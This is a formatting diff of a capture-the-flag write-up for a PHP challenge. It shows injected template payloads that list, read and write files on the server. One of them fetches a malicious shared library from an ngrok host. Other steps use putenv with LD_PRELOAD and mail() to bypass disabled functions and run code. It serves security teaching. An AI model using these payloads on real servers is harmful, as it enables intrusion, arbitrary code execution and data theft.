@@ -1,5 +1,5 @@
 ---
-description: 'PHP eval(), LD_PRELOAD RCE'
+description: PHP eval(), LD_PRELOAD RCE
 ---
 
 # C'mon See My Vulns
@@ -8,7 +8,9 @@ description: 'PHP eval(), LD_PRELOAD RCE'
 
 Government of Rhiza has been creating some tools to make the slave labor more efficient. Laura scanned all IPs addresses from Rhiza's ASN and found one of these tools. Your goal is to get into the server to be able to collect the IP addresses that connects to it. Once collected, we can find out the approximate location of these machines.
 
-{% file src="../../.gitbook/assets/c\_mon\_see\_my\_vulns.tar.gz" caption="C\'mon See My Vulns" %}
+{% file src="../../.gitbook/assets/c_mon_see_my_vulns.tar.gz" %}
+C'mon See My Vulns
+{% endfile %}
 
 ## Solution
 
@@ -61,23 +63,23 @@ The `open_basedir` setting restricts which files PHP can read/write to. We can s
 
 ![](../../.gitbook/assets/0769c1e345c34812838dcb44e3b9385b.png)
 
-Now that we know which functions are **not** allowed, let's look at what we **are** allowed to do. For the purposes of testing our POST requests, I used an API client called [Postman](https://www.postman.com/).
+Now that we know which functions are **not** allowed, let's look at what we **are** allowed to do. For the purposes of testing our POST requests, I used an API client called [Postman](https://www.postman.com).
 
 List files:
 
-```text
+```
 csv:price,tax↵200,{{implode('', scandir('.'))}}
 ```
 
 Read arbitrary files:
 
-```text
+```
 csv:price,tax↵200,{{file_get_contents('index.php')}}
 ```
 
 Write arbitrary files:
 
-```text
+```
 csv:price,tax↵200,{{file_put_contents('test', 'test')}}
 ```
 
@@ -85,7 +87,7 @@ Of course, the files we can work with will be restricted by the `open_basedir` s
 
 However, from the docker file, we know that there is a `readflag` binary. This will allow us to get the flag contents.
 
-```text
+```
 # Setup readflag binary
 COPY ./readflag.c readflag.c
 RUN gcc readflag.c -o readflag && chmod 4777 readflag && rm readflag.c
@@ -97,11 +99,11 @@ Here's a reference: [https://www.programmersought.com/article/20535983859/](http
 
 The basic theory is this:
 
-1. When we set the `LD_PRELOAD` environment variable to our custom `.so` file, our library takes precedence and gets loaded first, overriding the standard functions. 
+1\. When we set the `LD_PRELOAD` environment variable to our custom `.so` file, our library takes precedence and gets loaded first, overriding the standard functions. 
 
-2. `mail()` runs `/usr/sbin/sendmail` through `/bin/sh`. When this happens, functions like `getuid()` are called. 
+2\. `mail()` runs `/usr/sbin/sendmail` through `/bin/sh`. When this happens, functions like `getuid()` are called. 
 
-3. If we override `getuid()`, we can execute arbitrary code.
+3\. If we override `getuid()`, we can execute arbitrary code.
 
 Create a `hack.c` file as follows:
 
@@ -125,7 +127,7 @@ uid_t getuid() {
 
 Compile the shared library:
 
-```text
+```
 gcc -c -fPIC hack.c -o hack
 gcc -shared hack -o hack.so
 ```
@@ -136,7 +138,7 @@ Open a Python HTTP server and create a `ngrok` tunnel to transfer the file.
 
 Transfer the `hack.so` to a writeable directory with `file_put_contents` and `fopen`:
 
-```text
+```
 csv:price,tax↵200,{{file_put_contents('/var/www/html/hack.so', fopen('http://631b40831847.ngrok.io/hack.so', 'r'))}}
 ```
 
@@ -144,7 +146,7 @@ Use the `LD_PRELOAD` environment variable to force the loading of our custom `ge
 
 Note that all three have to be done in one request - the environment variable will only exist for the duration of the current request.
 
-```text
+```
 csv:price,tax↵200,{{putenv('LD_PRELOAD=/var/www/html/hack.so') . getenv('LD_PRELOAD') . mail('a','a','a','a')}}
 ```
 
@@ -154,7 +156,7 @@ From the Docker logs, we could see that `/bin/sh` was indeed executed.
 
 Check that it worked:
 
-```text
+```
 csv:price,tax↵200,{{implode('', scandir('.'))}}
 ```
 
@@ -184,11 +186,10 @@ uid_t getuid() {
 
 Now, after running the above steps again, we should have the flag in `output.txt`.
 
-```text
+```
 csv:price,tax↵200,{{file_get_contents('output.txt')}}
 ```
 
 Using `file_get_contents`, we can get the output.
 
 ![](../../.gitbook/assets/1a24c055e2c147b9816aababb1da218c.png)
-
